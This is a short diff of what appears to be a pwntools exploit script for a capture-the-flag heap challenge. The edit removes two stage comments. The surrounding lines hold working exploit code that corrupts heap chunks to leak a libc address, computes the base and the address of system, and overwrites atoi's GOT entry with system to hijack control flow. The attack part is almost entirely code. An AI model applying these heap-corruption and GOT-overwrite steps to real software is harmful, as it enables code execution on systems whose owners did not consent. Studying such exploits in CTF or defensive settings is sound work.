@@ -45,14 +45,13 @@ edit(3, 0x90, payload)
 
 delete(4)								#free(4) but 3 in unsoftedbin because of payload made the prog think the 3 th is unsortedbin
 
-#### stage3: leak libc ###########################################################
 edit(3, 0x8, p64(0x602020))				#now all we edit chunk(3) is edit(0x6020e0). 0x6020e0 is the address of all chunk's data address
 show(0)
 p.recvuntil(b"Data = ")
 libc=int.from_bytes(p.recv(6),"little")-424032
 log.info("[+]libc base"+hex(libc))
 
-#### stage 4 overwrite malloc with onegadget#######
+
 atoi_got=0x602068
 system=libc+0x3f550
 edit(3, 8,p64(atoi_got))				#over_write atoi_got to system (readInt() func)
